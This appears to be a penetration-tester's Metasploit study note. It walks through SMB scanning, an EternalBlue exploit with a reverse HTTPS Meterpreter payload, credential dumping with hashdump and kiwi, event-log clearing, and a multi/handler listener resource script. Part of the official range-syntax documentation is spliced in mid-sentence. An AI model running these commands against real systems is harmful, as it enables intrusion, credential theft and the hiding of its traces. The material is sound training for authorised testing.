    <h2>TLDR;</h2>
<p>Metasploit is invaluable when you treat it like any other engineering tool: scripted, logged, and explained. This pass adds the concrete procedures captured in the labs.</p>
<h3>Reconnaissance Modules</h3>
<pre><code>use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.119.0/24
run

use auxiliary/scanner/http/title
set THREADS 20
run
</code></pre>
<ul>
<li>Export run results (<code>services -S smb -u</code>).</li>
<li>Store workspace states: <code>workspace -a acme-internal</code> then <code>db_export -f xml acme-internal.xml</code> for backup.</li>
</ul>
<h3>Exploitation Workflow</h3>
<ol>
<li>Load module → <code>show options</code> → set <code>RHOSTS</code>, <code>RPORT</code>, <code>PAYLOAD</code>, <code>LHOST</code>, <code>LPORT</code>.</li>
<li>Use <code>check</code> when available to confirm vulnerability.</li>
<li>Enable logging: <code>spool logs/acme-msf.log</code> before <code>run</code>.</li>
</ol>
<pre><code>use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.119.21
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 192.168.49.1
set EXITFUNC thread
run -j
</code></pre>
<ul>
<li>Record session IDs, pivot hosts, and post modules executed.</li>
</ul>
<h3>Post-Exploitation Discipline</h3>
<pre><code>sessions -i 1
sysinfo
getuid
hashdump
load kiwi

run post/windows/gather/enum_logged_on_users
run post/multi/gather/enum_domain_group_users GROUP=&quot;Domain Admins&quot;
</code></pre>
<ul>
<li>Dump loot into organised directories (<code>loot</code>, <code>download</code>).</li>
<li>Clean up (<code>clearev</code>, <code>migrate</code>, <code>sessions -k &lt;id&gt;</code>) once tasks complete.</li>
</ul>
<h3>Automation</h3>
<ul>
<li>Resource scripts (<code>msfconsole -r scripts/acme_exploit.rc</code>) to reproduce module setups. Include comments and <code>sleep</code> commands when waiting for services.</li>
<li>Metasploit RPC for integration:</li>
</ul>
<pre><code>msfrpcd -P supersecret -S
python3 metasploit_helper.py --module exploit/windows/http/struts2_content_type_ognl --rhosts 192.168.119.45
</code></pre>
<ul>
<li>Always store resource files and automation scripts in version control with timestamps.</li>
</ul>
<h3>Operational Hygiene</h3>
<ul>
<li>Disable <code>autopwn</code>, default payloads, and <code>Meterpreter</code> features not explicitly required by rules of engagement.</li>
<li>Log every module you run, including unsuccessful ones, for transparency.</li>
</ul>
<h3>Defensive Recommendations</h3>
<ul>
<li>Provide patch KB references, disabling SMBv1, enabling RDP network-level authentication, etc.</li>
<li>Supply detection ideas: unusual <code>svchost</code> behaviour, creation of service <code>%TEMP%\random.exe</code>, outbound HTTPS to C2 IP.</li>
</ul>
<p>Metasploit should never be a black box. Script it, log it, and justify every module so the client gains confidence alongside the shell access you deliver.</p>

<h5>Setup and Work with MSF</h5>
<p>MSF comes preinstalled on Kali but doesn&#39;t start its DB service in the default configuration.  Use of the DB is not mandatory, but there are compelling reasons to like storing info about target hosts and tracking successful exploitation attempts. Building ranges and lists
-------------------------

Many commands and options that take a list of things can use ranges to avoid
having to manually list each desired thing. All ranges are inclusive.

##### Ranges of IDs

Commands that take a list of IDs can use ranges to help. Individual IDs must be
separated by a `,` (no space allowed) and ranges can be expressed with either
`-` or `..`.

##### Ranges of IPs

There are several ways to specify ranges of IP addresses that can be mixed
together. The first way is a list of IPs separated by just a ` ` (ASCII space),
with an optional `,`. The next way is two complete IP addresses in the form of
`BEGINNING_ADDRESS-END_ADDRESS` like `127.0.1.44-127.0.2.33`. CIDR
specifications may also be used, however the whole address must be given to
Metasploit like `127.0.0.0/8` and not `127/8`, contrary to the RFC.
Additionally, a netmask can be used in conjunction with a domain name to
dynamically resolve which block to target. All these methods work for both IPv4
and IPv6 addresses. IPv4 addresses can also be specified with special octet
ranges from the [NMAP target
specification](https://nmap.org/book/man-target-specification.html)

##### Examples

Terminate the first sessions:

    sessions -k 1

Stop some extra running jobs:

    jobs -k 2-6,7,8,11..15

Check a set of IP addresses:

    check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255

Target a set of IPv6 hosts:

    set RHOSTS fe80::3990:0000/110, ::1-::f0f0

Target a block from a resolved domain name:

    set RHOSTS www.example.test/24

<h5>Staged vs Non-Staged Payloads</h5>
<p>Let&#39;s explore the difference between stages and non-staged payloads.  Assume we have identified a buffer overflow vuln in a server.  As we learned, we must be aware of the buffer size our shellcode will be stored in.  If the shellcode size exceeds buffer, our exploit will fail, making payload type vital.</p>
<p>The diff is subtle but important.  A non-staged payload is sent complete with the exploit, the payload contains the exploit and full shellcode for task.  Generally, these all-in-one payloads are more stable, but the size is larger than other types.</p>
<p>Staged payloads are sent in two parts.  The first is a small primary payload that has the victim connect back to the attacker, transfering a larget secondary payload with the rest of the shellcode, finally executing it.</p>
<p>There are several situations in which we would prefer to use a staged payload instead of non-staged.  A staged payload may be a better choice when there are space limitations in an exploit, they are typically smaller.  AV can detect shellcode in an exploit, by utilizing a first stage, which loads second stage shellcode, retrieving the shellcode and injecting into memory detection may be prevented, increasing out chances of success.</p>

<h5>Meterpreter Payload</h5>
<p>We used a common TCP rev shell in the last section, which provided an interactive shell on the target system, but we only had the functionality of a regular command shell. Meterpreter offers capabilities that are especially useful in the post-exploitation phase and is available for various OS.</p>

<li>Linux.</li>
<li>MacOS.</li>

<h5>Resource Scripts</h5>
<p>MSF resource scripts chain together a series of console comands and Ruby code.  We can use either built-in commands of Metasploit or write Ruby code to manage control flow and develop advanced logic components.</p>
<p>In a pentest we may need to setup several multi/handler listeners each time we want to receive an incoming reverse shell.  We could let Metasploit run in the background the whole time or start Metasploit and manually start a listener each time.  We could also create a resource script to automate this.</p>
<p>Let&#39;s create a script that starts a multi/handler listener for a non-staged Win x64 Meterpreter payload.  To do this we create a file in home dir of Kali named <code>listener.rc</code> and open it a text editor.</p>
<p>We first need to determine the command sequence we want to use.  In this example, the first command activates the multi/handler module.  Next we set the payload, <code>windows/meterpreter_reverse_https</code>, the we set our <code>LHOST</code> and <code>LPORT</code> options.</p>
<pre><code>
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443
</code></pre>
<p>Additionally we can configure the <code>AutoRunScript</code> option to automatically exec a mod after a session is created.  In this example we will use <code>post/windows/manage/migrate</code> module.  This will cause the spawned Meterpreter to automatically launch a background <code>notepad.exe</code> process to migrate to.  Automating process migration helps to avoid situations where our payload is killed prematurely by defensive technology or termination of the process.</p>
<pre><code>
set AutoRunScript post/windows/manage/migrate
</code></pre>
<p>We also set <code>ExitOnSession</code> to <code>false</code> to ensure that the listener keeps accepting new connections after a session is created.</p>
<pre><code>
set ExitOnSession false
</code></pre>
<p><em>We can also configure advanced options such as ExitOnSession in multi/handler and AutoRunScript in payloads by using show advanced within the activated module or selected payload.</em></p>
<p>Finally we add <code>run</code> with args <code>-z -j</code> to run it as a job in the bg and stop us from automatically interacting with the session.</p>
<pre><code>
run -z -j
</code></pre>
<p>Save the script and start Metasploit by passing the resource script as arg for <code>-r</code>.</p>
<pre><code class="language-bash">
sudo msfconsole -r listener.rc
</code></pre>
